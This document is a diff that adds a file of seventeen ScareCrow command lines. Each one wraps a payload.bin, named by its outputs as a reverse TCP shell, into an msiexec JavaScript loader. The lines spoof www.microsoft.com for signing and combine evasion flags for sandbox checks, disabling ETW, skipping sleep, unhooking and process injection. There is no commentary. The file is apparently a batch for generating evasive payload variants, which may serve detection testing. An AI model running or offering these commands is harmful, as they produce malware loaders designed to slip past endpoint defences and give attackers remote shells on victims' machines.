@@ -1,0 +1,17 @@
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -sandbox -O payload_rev_tcp_sandbox.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -nosleep -O payload_rev_tcp_nosleep.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -noetw -O payload_rev_tcp_noetw.js
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -injection "C:\\Windows\\Temp\\" -O payload_rev_tcp_injection.js  
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -unmodified -O payload_rev_tcp_unmod.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sanbox_nosleep.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_unmod_sandbox_nosleep_noetw.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -noetw -nosleep -O payload_rev_tcp_nosleep_noetw.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -noetw -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep_noetw.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -injection "C:\\Windows\\Temp\\" -noetw -nosleep -sandbox -O payload_rev_tcp_inject_sandbox_nosleep_noetw.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -injection "C:\\Windows\\Temp\\" -sandbox -O payload_rev_tcp_inject_sandbox.js
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -injection "C:\\Windows\\Temp\\" -noetw -O payload_rev_tcp_inject_noetw.js
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -injection "C:\\Windows\\Temp\\" -nosleep -O payload_rev_tcp_inject_nosleep.js
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -injection "C:\\Windows\\Temp\\" -unmodified -O payload_rev_tcp_inject_unmod.js
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -nosleep -sandbox -O payload_rev_tcp_sandbox_nosleep.js 
+./ScareCrow -I payload.bin -Loader msiexec -domain www.microsoft.com -injection "C:\\Windows\\Temp\\" -noetw -nosleep -sandbox -unmodified -O payload_rev_tcp_all.js
